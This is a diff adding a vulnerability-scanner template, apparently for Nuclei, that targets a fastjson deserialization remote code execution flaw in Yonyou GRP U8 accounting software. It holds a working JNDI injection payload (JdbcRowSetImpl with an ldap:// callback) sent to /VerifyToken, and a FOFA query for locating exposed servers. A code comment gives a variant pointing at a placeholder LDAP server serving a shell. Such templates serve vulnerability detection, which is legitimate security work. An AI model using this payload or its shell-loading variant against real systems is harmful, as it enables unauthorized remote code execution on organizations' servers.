@@ -1,0 +1,40 @@
+id: yonyou-grp-u8-VerifyToken-fastjson-rce
+info:
+  name: 用友 GRP U8 bx_historyDataCheck.jsp - fastjson rce
+  author: cnaq
+  severity: critical  
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/7b901f2d74fd35dab03f6ebeb289c9d2e14ddaa0/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BU8GRP-fastjson%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="用友-GRP-U8" || title="用友GRP-U8行政事业内控管理软件" || icon_hash="-299520369"
+  tags: yonyou,grpu8,rce,oa,oob
+
+http:
+  - raw:
+      - |
+        POST /VerifyToken HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 322
+        
+        PARAM={{base64("{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}")}}
+
+# {"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxxxx:1389/Deserialization/fastjson1/filtershell","autoCommit":true}}
+   
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
